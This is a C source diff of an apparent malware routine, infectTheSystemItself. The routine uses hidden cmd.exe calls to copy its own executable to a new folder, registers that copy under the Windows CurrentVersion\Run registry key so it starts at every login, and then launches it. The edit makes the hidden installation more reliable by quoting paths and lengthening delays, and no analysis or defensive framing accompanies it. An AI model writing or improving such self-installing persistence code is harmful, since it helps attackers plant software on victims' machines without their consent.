@@ -31,11 +31,11 @@ void infectTheSystemItself(void)
 
 	snprintf(targetPathwithName, 400, "%s\\%s", targetPath, progName);
 
-	snprintf(command, 400, "cmd.exe /c mkdir %s", targetPath);
-	WinExec(command, SW_HIDE); Sleep(200);
+	snprintf(command, 400, "cmd.exe /c mkdir \"%s\"", targetPath);
+	WinExec(command, SW_HIDE); Sleep(500);
 
-	snprintf(command, 400, "cmd.exe /c copy %s %s", srcPathwithName, targetPathwithName);
-	WinExec(command, SW_HIDE); Sleep(200);
+	snprintf(command, 400, "cmd.exe /c copy \"%s\" \"%s\"", srcPathwithName, targetPathwithName);
+	WinExec(command, SW_HIDE); Sleep(500);
 
 	if(ERROR_SUCCESS == RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey))
 	{
@@ -54,7 +54,7 @@ void infectTheSystemItself(void)
 	RegCloseKey(hKey);
 
 	snprintf(command, 400, "cmd.exe /c start %s", targetPathwithName);
-	WinExec(command, SW_HIDE); Sleep(200);
+	WinExec(command, SW_HIDE); Sleep(500);
 
 	exit(0);
 }
